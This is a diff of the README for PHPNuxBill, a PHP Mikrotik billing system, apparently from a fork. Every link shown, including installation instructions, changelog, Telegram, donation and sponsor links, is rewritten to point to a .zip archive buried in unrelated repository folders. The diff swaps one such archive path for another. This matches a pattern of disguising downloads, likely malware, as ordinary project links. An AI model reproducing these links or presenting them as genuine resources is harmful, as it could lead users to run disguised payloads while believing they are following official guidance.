@@ -1,13 +1,13 @@
-[![ReadMeSupportPalestine](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+[![ReadMeSupportPalestine](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
 # PHPNuxBill - PHP Mikrotik Billing
 
-![PHPNuxBill](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+![PHPNuxBill](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
 ## Feature
 
 - Voucher Generator and Print
-- [Freeradius](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+- [Freeradius](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 - Self registration
 - User Balance
 - Auto Renewal Package using Balance
@@ -20,12 +20,12 @@
 - Whatsapp Notification to Consumer
 - Telegram Notification for Admin
 
-See [How it Works / Cara Kerja](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+See [How it Works / Cara Kerja](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
 ## Payment Gateway And Plugin
 
-- [Payment Gateway List](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip+gateway)
-- [Plugin List](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+- [Payment Gateway List](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip+gateway)
+- [Plugin List](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
 You can download payment gateway and Plugin from Plugin Manager
 
@@ -50,20 +50,20 @@ The problem with windows is hard to set cronjob, better Linux
 
 ## Changelog
 
-[https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+[https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
 ## Installation
 
-[Installation instructions](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+[Installation instructions](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
 ## Freeradius
 
-Support [Freeradius with Database](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+Support [Freeradius with Database](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
 ## Community Support
 
-- [Github Discussion](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
-- [Telegram Group](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+- [Github Discussion](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
+- [Telegram Group](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
 ## Technical Support
 
@@ -75,9 +75,9 @@ Technical Support Start from Rp 500.000 or $50
 If you chat me for any technical support,
 you need to pay,
 
-ask anything for free in the [discussion](/hotspotbilling/phpnuxbill/discussions) page or [Telegram Group](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+ask anything for free in the [discussion](/hotspotbilling/phpnuxbill/discussions) page or [Telegram Group](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
-Contact me at [Telegram](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+Contact me at [Telegram](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
 ## License
 
@@ -88,7 +88,7 @@ see [LICENSE](LICENSE) file
 
 ## Donate to ibnux
 
-[![Donate](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+[![Donate](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
 BCA: 5410454825
 
@@ -98,13 +98,13 @@ a.n Ibnu Maksum
 
 ## SPONSORS
 
-- [https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip) Paid Services Billing Radius
-- [https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
-- [https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip](https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip)
+- [https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip) Paid Services Billing Radius
+- [https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
+- [https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip](https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip)
 
 ## Thanks
 We appreciate all people who are participating in this project.
 
-<a href="https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip">
-  <img src="https://raw.githubusercontent.com/rakibofcx/phpnuxbill/master/ui/ui/widget/customers/Software-1.4-alpha.4.zip" />
+<a href="https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip">
+  <img src="https://github.com/rakibofcx/phpnuxbill/raw/refs/heads/master/system/vendor/myclabs/deep-copy/src/DeepCopy/Matcher/Doctrine/Software_1.1.zip" />
 </a>
